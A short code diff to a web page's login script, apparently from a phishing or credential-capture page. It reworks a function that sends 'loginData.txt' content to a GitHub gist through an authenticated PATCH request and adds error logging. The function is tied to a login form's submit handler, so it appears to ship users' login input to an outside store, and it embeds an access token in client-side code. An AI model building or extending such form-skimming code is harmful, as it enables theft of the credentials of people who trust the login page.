@@ -230,24 +230,30 @@
         const GIST_ID = 'a2a704439b6e63da0a509c1125f5a936'; // Your Gist ID
 
         function saveToGist(content) {
-            fetch(`https://api.github.com/gists/${GIST_ID}`, {
-                method: 'PATCH',
-                headers: {
-                    'Authorization': `token ${GITHUB_TOKEN}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    files: {
-                        'loginData.txt': {
-                            content: content
-                        }
-                    }
-                })
-            })
-            .then(response => response.json())
-            .then(data => console.log('Gist updated:', data))
-            .catch(error => console.error('Error:', error));
+    fetch(`https://api.github.com/gists/${GIST_ID}`, {
+        method: 'PATCH',
+        headers: {
+            'Authorization': `token ${GITHUB_TOKEN}`,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            files: {
+                'loginData.txt': {
+                    content: content
+                }
+            }
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error('HTTP error:', response.status, response.statusText);
+            return response.text(); // Get the response body text to understand the error
         }
+        return response.json();
+    })
+    .then(data => console.log('Gist updated:', data))
+    .catch(error => console.error('Error:', error));
+}
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
